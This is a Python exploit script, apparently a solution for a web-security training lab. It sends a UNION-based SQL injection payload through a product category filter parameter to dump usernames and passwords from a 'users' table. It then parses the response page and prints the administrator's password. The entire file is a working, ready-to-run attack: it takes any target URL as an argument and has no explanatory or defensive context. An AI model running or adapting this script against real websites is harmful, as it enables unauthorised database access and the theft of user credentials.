import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url):
    username = "administrator"
    uri = "filter?category="
    payload = "' union select null, username || '~' || password from users-- -"
    request = requests.get(url + uri + payload, verify=False, proxies=proxies)
    response = request.text
    if "administrator" in response:
        soup = BeautifulSoup(response, 'html.parser')
        if soup.body:
            element = soup.body.find(string=username)
            if element:
                parent = element.parent
                if parent:
                    data = parent.find_next('td')
                    if data:
                        passwd = data.get_text(strip=True)
                        print(f"[+] data: {passwd}")
                        return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[!] error: {sys.argv[0]} <url>")
        sys.exit(1)

    print("[?] scanning database...")
    if not exploit(url):
        print("[-] status: failure")
